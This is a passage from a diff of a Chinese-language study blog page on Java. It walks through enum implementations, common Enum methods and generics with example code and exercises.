class="string">&quot;XXX&quot;</span>);</span><br><span class="line">        autumn.setDesc(<span class="string">&quot;xxxxxxxxxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Season other = <span class="keyword">new</span> Season(<span class="string">&quot;春夏交替&quot;</span>,<span class="string">&quot;时冷时热&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(autumn);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Season</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String desc;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Season</span><span class="params">(String name,String desc)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.desc = desc;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDesc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> desc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDesc</span><span class="params">(String desc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.desc = desc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Season&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, desc=&#x27;&quot;</span> + desc + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="二、枚举实现"><a href="#二、枚举实现" class="headerlink" title="二、枚举实现"></a>二、枚举实现</h3><h4 id="1-自定义实现"><a href="#1-自定义实现" class="headerlink" title="1. 自定义实现"></a>1. 自定义实现</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> season;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Enum01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(Season.SPRING);</span><br><span class="line">        System.out.println(Season.SUMMER);</span><br><span class="line">        System.out.println(Season.AUTUMN);</span><br><span class="line">        System.out.println(Season.WINTER);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Season</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  String name;</span><br><span class="line">    <span class="keyword">private</span>  String desc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Season SPRING = <span class="keyword">new</span> Season(<span class="string">&quot;春天&quot;</span>,<span class="string">&quot;温暖&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Season SUMMER = <span class="keyword">new</span> Season(<span class="string">&quot;夏天&quot;</span>,<span class="string">&quot;炎热&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Season AUTUMN = <span class="keyword">new</span> Season(<span class="string">&quot;秋天&quot;</span>,<span class="string">&quot;凉爽&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Season WINTER = <span class="keyword">new</span> Season(<span class="string">&quot;冬天&quot;</span>,<span class="string">&quot;寒冷&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Season</span><span class="params">(String name,String desc)</span></span>&#123;         <span class="comment">//将构造器私有化，防止直接new</span></span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.desc = desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;					  <span class="comment">//去掉 set 方法, 防止属性被修改</span></span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDesc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;season&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, desc=&#x27;&quot;</span> + desc + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="https://colson-max.github.io/2022/04/24/JavaSE/04/24/JavaSE/1.png" class width="1">
+
+<h4 id="2-enum-关键字实现"><a href="#2-enum-关键字实现" class="headerlink" title="2. enum 关键字实现"></a>2. enum 关键字实现</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> season;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Enum01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(Season.SPRING);</span><br><span class="line">        System.out.println(Season.SUMMER);</span><br><span class="line">        System.out.println(Season.AUTUMN);</span><br><span class="line">        System.out.println(Season.WINTER);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Season</span></span>&#123;		<span class="comment">//使用关键字 enum 替代 class</span></span><br><span class="line">	<span class="comment">//要求将定义常量对象写在最前面，如果有多个常量(对象)， 使用 “,” 号间隔，最后有一个分号结尾</span></span><br><span class="line">    SPRING(<span class="string">&quot;春天&quot;</span>,<span class="string">&quot;温暖&quot;</span>),SUMMER(<span class="string">&quot;夏天&quot;</span>,<span class="string">&quot;炎热&quot;</span>),AUTUMN(<span class="string">&quot;秋天&quot;</span>,<span class="string">&quot;凉爽&quot;</span>),WINTER(<span class="string">&quot;冬天&quot;</span>,<span class="string">&quot;寒冷&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String desc;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//构造器关键字不能用 public </span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Season</span><span class="params">()</span> </span>&#123;               <span class="comment">//无参</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Season</span><span class="params">(String name, String desc)</span> </span>&#123;           <span class="comment">//有参</span></span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.desc = desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDesc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Season&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, desc=&#x27;&quot;</span> + desc + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果和上图一样。</p>
+<h3 id="三、enum-常用方法"><a href="#三、enum-常用方法" class="headerlink" title="三、enum 常用方法"></a>三、enum 常用方法</h3><p>使用关键字 enum ，会隐式继承 Enum 类，所以我们可以使用 Enum 类相关的方法。</p>
+<p>toString：返回的是当前对象名,子类可以重写该方法，用于返回对象的属性信息<br>name：返回当前对象名（常量名），子类中不能重写<br>ordinal：返回当前对象的编号(定义时的位置)，默认从 0 开始<br>values：返回当前枚举类中所有的常量<br>valueOf：将字符串转换成枚举对象，要求字符串必须为已有的常量名，否则报异常！<br>compareTo：比较两个枚举常量，比较的就是编号</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> season;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EnumMethod</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Season autumn = Season.AUTUMN;      <span class="comment">//使用 Season 枚举类，来演示</span></span><br><span class="line"></span><br><span class="line">        System.out.println(autumn.name());      <span class="comment">//输出枚举对象的名字</span></span><br><span class="line"></span><br><span class="line">        System.out.println(autumn.ordinal());       <span class="comment">// ordinal() 输出的是该枚举对象的编号</span></span><br><span class="line"></span><br><span class="line">        Season[] values = Season.values();      <span class="comment">//</span></span><br><span class="line">        System.out.println(<span class="string">&quot;======遍历出枚举对象（增强for）=====&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(Season season : values)&#123;</span><br><span class="line">            System.out.println(season);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//valueOf：将字符串转换成枚举对象，要求字符串必须为已有的常量名，否则报异常</span></span><br><span class="line">        Season autumn1 = Season.valueOf(<span class="string">&quot;AUTUMN&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;autumn1=&quot;</span> + autumn1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//compareTo：比较两个枚举常量，比较的就是编号</span></span><br><span class="line">        System.out.println(Season.AUTUMN.compareTo(Season.SUMMER));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="四、week实例"><a href="#四、week实例" class="headerlink" title="四、week实例"></a>四、week实例</h3><p>题目：</p>
+<ul>
+<li>声明 Week 枚举类，其中包含星期一至星期日的定义</li>
+<li>MONDAY, TUESDAY, WEDNESDAY, THURSDAY, FRIDAY,SATURDAY, SUNDAY;</li>
+<li>使用 values 返回所有的枚举数组, 并遍历</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Week;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">example</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">        System.out.println(week.SUNDAY);</span></span><br><span class="line"><span class="comment">        System.out.println(week.MONDAY);</span></span><br><span class="line"><span class="comment">        System.out.println(week.TUESDAY);</span></span><br><span class="line"><span class="comment">        System.out.println(week.WEDNESDAY);</span></span><br><span class="line"><span class="comment">        System.out.println(week.THURSDAY);</span></span><br><span class="line"><span class="comment">        System.out.println(week.FIRDAY);</span></span><br><span class="line"><span class="comment">        System.out.println(week.SATURDAY);</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        </span><br><span class="line">        week[] weeks = week.values();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(week w : weeks)&#123;</span><br><span class="line">            System.out.println(w);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">week</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    SUNDAY(<span class="string">&quot;星期日&quot;</span>),MONDAY(<span class="string">&quot;星期一&quot;</span>), TUESDAY(<span class="string">&quot;星期二&quot;</span>),WEDNESDAY(<span class="string">&quot;星期三&quot;</span>),</span><br><span class="line">    THURSDAY(<span class="string">&quot;星期四&quot;</span>),FIRDAY(<span class="string">&quot;星期五&quot;</span>),SATURDAY(<span class="string">&quot;星期六&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    week(String name) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;week&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//output:</span></span><br><span class="line">	week&#123;name=<span class="string">&#x27;星期日&#x27;</span>&#125;</span><br><span class="line">    week&#123;name=<span class="string">&#x27;星期一&#x27;</span>&#125;</span><br><span class="line">    week&#123;name=<span class="string">&#x27;星期二&#x27;</span>&#125;</span><br><span class="line">    week&#123;name=<span class="string">&#x27;星期三&#x27;</span>&#125;</span><br><span class="line">    week&#123;name=<span class="string">&#x27;星期四&#x27;</span>&#125;</span><br><span class="line">    week&#123;name=<span class="string">&#x27;星期五&#x27;</span>&#125;</span><br><span class="line">    week&#123;name=<span class="string">&#x27;星期六&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="五、-enum-实现接口"><a href="#五、-enum-实现接口" class="headerlink" title="五、 enum 实现接口"></a>五、 enum 实现接口</h3><p>由于 Java 是单继承机制，所以使用 enum 关键字后，就不能再继承其他类。</p>
+<p>但是枚举类和普通类一样可以实现接口。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> 类名 <span class="keyword">implements</span> 接口1,接口2</span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Java-泛型"><a href="#Java-泛型" class="headerlink" title="Java-泛型"></a>Java-泛型</h2><hr>
+<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>泛型的本质是参数化类型，就是操作的数据类型被指定为一个参数，也就是说我们可以使用<strong>泛型</strong>对整型数组、字符串数组甚至其它类型的数组进行排序。</p>
+<h3 id="使用泛型的目的"><a href="#使用泛型的目的" class="headerlink" title="使用泛型的目的"></a>使用泛型的目的</h3><p>可以避免在运行时强制类型转换发生类型转换异常(ClassCastException)</p>
+<hr>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>在 ArrayList 中，添加 3 个 Dog 对象，Dog 对象含有 name 和 age，并输出 name 和age (要求使用getXxx())</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">public class Generic01 &#123;</span></span><br><span class="line"><span class="comment">    public static void main(String[] args)&#123;</span></span><br><span class="line"><span class="comment">        ArrayList arrayList = new ArrayList();</span></span><br><span class="line"><span class="comment">        arrayList.add(new Dog(&quot;Dog&quot;,1));</span></span><br><span class="line"><span class="comment">        arrayList.add(new Dog(&quot;DDogg&quot;,1));					//传统方法</span></span><br><span class="line"><span class="comment">        arrayList.add(new Dog(&quot;DDDoggg&quot;,1));</span></span><br><span class="line"><span class="comment">        for(Object o : arrayList)&#123;</span></span><br><span class="line"><span class="comment">            Dog dog = (Dog) o;</span></span><br><span class="line"><span class="comment">            System.out.println(dog.getName());</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">*/</span>   </span><br><span class="line"> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Generic01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        ArrayList&lt;Dog&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        arrayList.add(<span class="keyword">new</span> Dog(<span class="string">&quot;Dog2&quot;</span>,<span class="number">1</span>));					<span class="comment">//使用泛型</span></span><br><span class="line">        arrayList.add(<span class="keyword">new</span> Dog(<span class="string">&quot;DDogg2&quot;</span>,<span class="number">1</span>));</span><br><span class="line">        arrayList.add(<span class="keyword">new</span> Dog(<span class="string">&quot;DDDoggg2&quot;</span>,<span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span> (Dog dog : arrayList)&#123;   <span class="comment">//增强for循环</span></span><br><span class="line">            System.out.println(dog.getName());</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    </span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Dog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Dog</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><h4 id="1-编译时，检查添加元素的类型，提高了安全性"><a href="#1-编译时，检查添加元素的类型，提高了安全性" class="headerlink" title="1. 编译时，检查添加元素的类型，提高了安全性"></a>1. 编译时，检查添加元素的类型，提高了安全性</h4><h4 id="2-不再提示编译警告"><a href="#2-不再提示编译警告" class="headerlink" title="2. 不再提示编译警告"></a>2. 不再提示编译警告</h4><h4 id="3-减少了类型转换的次数，提高效率"><a href="#3-减少了类型转换的次数，提高效率" class="headerlink" title="3. 减少了类型转换的次数，提高效率"></a>3. 减少了类型转换的次数，提高效率</h4><p>​    不使用泛型 Dog -&gt; Object -&gt; Dog //放入到 ArrayList 会先转成 Object，在取出时，还需要转换成 Dog<br>​    使用泛型 Dog-&gt; Dog -&gt; Dog //放入和取出时，不需要类型转换，提高效率</p>
+<hr>
+<h3 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h3><p>泛型默认 Object</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span>&lt;&gt;</span>&#123;			<span class="comment">// 创建对象时没有指定类型，默认是 Object</span></span><br><span class="line">    E s;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Dog</span><span class="params">(E s)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.s = s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List List = <span class="keyword">new</span> List();</span><br><span class="line"><span class="comment">//       等价于</span></span><br><span class="line">List&lt;Object&gt; List = <span class="keyword">new</span> List&lt;&gt;();</span><br></pre></td></tr></table></figure>
+
+<p>泛型类型必须是<strong>引用类型</strong>（非基本数据类型）</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();	<span class="comment">//正确</span></span><br><span class="line">List&lt;Int&gt; list = <span class="keyword">new</span> ArraayList&lt;<span class="keyword">int</span>&gt;();	<span class="comment">//错误</span></span><br></pre></td></tr></table></figure>
+
+<p>使用形式</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; list = <span class="keyword">new</span> List&lt;Integer&gt;();</span><br><span class="line">List&lt;Integer&gt; list = <span class="keyword">new</span> List&lt;&gt;();<span class="comment">//推荐使用简写</span></span><br></pre></td></tr></table></figure>
+
+<p>由于使用自定义泛型的类，只有在实例化的时候才知道这个类型参数是什么，所以导致</p>
+<p>（1）使用泛型的数组不能初始化<br>（2）静态方法和静态属性并不能使用泛型</p>
+<h3 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h3><p>eg:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *          泛型接口的定义格式：      修饰符 interface 接口名&lt;数据类型&gt;&#123;</span></span><br><span class="line"><span class="comment"> *          </span></span><br><span class="line"><span class="comment"> *                                      &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Inter</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">(T t)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *      子类是泛型类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InterImpl</span>&lt;<span class="title">E</span>&gt; <span class="keyword">implements</span> <span class="title">Inter</span>&lt;<span class="title">E</span>&gt;</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">(E t)</span></span>&#123;</span><br><span class="line">        System.out.println(t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Inter&lt;String&gt; inter = <span class="keyword">new</span> Inter&lt;String&gt;();</span><br><span class="line">inter.show(<span class="string">&quot;hello&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="泛型方法"><a href="#泛型方法" class="headerlink" title="泛型方法"></a>泛型方法</h3><p>可以使用类声明的泛型，也可以使用自己的声明泛型</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fish</span>&lt;<span class="title">T</span>, <span class="title">R</span>&gt; </span>&#123;		<span class="comment">//泛型类 </span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;		<span class="comment">//普通方法 </span></span><br><span class="line">	&#125; </span><br><span class="line">	<span class="function"><span class="keyword">public</span>&lt;U,M&gt; <span class="keyword">void</span> <span class="title">eat</span><span class="params">(U u, M m)</span> </span>&#123;		<span class="comment">//泛型方法 </span></span><br><span class="line">	&#125; </span><br><span class="line">	<span class="comment">/**说明 </span></span><br><span class="line"><span class="comment"> 	*1. 下面hi 方法不是泛型方法 </span></span><br><span class="line"><span class="comment"> 	*2. 是hi 方法使用了类声明的泛型 </span></span><br><span class="line"><span class="comment"> 	*/</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hi</span><span class="params">(T t)</span> </span>&#123; </span><br><span class="line">	&#125; </span><br><span class="line">	<span class="comment">//泛型方法，可以使用类声明的泛型，也可以使用自己声明泛型 </span></span><br><span class="line">	<span class="function"><span class="keyword">public</span>&lt;K&gt; <span class="keyword">void</span> <span class="title">hello</span><span class="params">(R r, K k)</span> </span>&#123;</span><br><span class="line">		System.out.println(r.getClass());<span class="comment">//ArrayList </span></span><br><span class="line">		System.out.println(k.getClass());<span class="comment">//Float </span></span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//例子</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">fun</span><span class="params">(T t)</span></span>&#123;      <span class="comment">//可以接收任意类型的数据</span></span><br><span class="line">        <span class="keyword">return</span> t;       <span class="comment">//直接把参数返回</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenericsDemo</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Demo d = <span class="keyword">new</span> Demo();            <span class="comment">//实例化 Demo 对象</span></span><br><span class="line">        String str = d.fun(<span class="string">&quot;Tom&quot;</span>);      <span class="comment">//传递字符串</span></span><br><span class="line">        <span class="keyword">int</span> i = d.fun(<span class="number">30</span>);          <span class="comment">//传递数字，自动装箱</span></span><br><span class="line">        System.out.println(str);        </span><br><span class="line">        System.out.println(i);          <span class="comment">//输出</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="源码中泛型使用"><a href="#源码中泛型使用" class="headerlink" title="源码中泛型使用"></a>源码中泛型使用</h3><hr>
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="定义Employee类"><a href="#定义Employee类" class="headerlink" title="定义Employee类"></a>定义Employee类</h4><p>该类包含: private成员变量name,sal,birthday, 其中birthday为MyDate类的对象<br>为每一个属性定义getter, setter方法<br>重写toString方法输出name, sal, birthday</p>
+<h4 id="定义MyDate类"><a href="#定义MyDate类" class="headerlink" title="定义MyDate类"></a>定义MyDate类</h4><p>包含: private成员变量month,day,year<br>并为每一个属性定义getter,setter方法</p>
+<h4 id="创建该类的3个对象，并把这些对象放入ArrayList集合中-ArrayList需使用泛型来定义"><a href="#创建该类的3个对象，并把这些对象放入ArrayList集合中-ArrayList需使用泛型来定义" class="headerlink" title="创建该类的3个对象，并把这些对象放入ArrayList集合中(ArrayList需使用泛型来定义)"></a>创建该类的3个对象，并把这些对象放入ArrayList集合中(ArrayList需使用泛型来定义)</h4><p>对集合中的元素进行排序，并遍历输出<br>排序方式:调用ArrayList 的sort方法，传入Comparator对象[使用泛型]，先按照<br>name排序，如果name相同，则按生日日期的先后排序。 即:定制排序</p>
+<p>代码：<a href="https://github.com/Colson-max/Java-Generic_Employeee">https://github.com/Colson-max/Java-Generic_Employeee</a></p>
+<h2 id="Java-异常"><a href="#Java-异常" class="headerlink" title="Java-异常"></a>Java-异常</h2><hr>
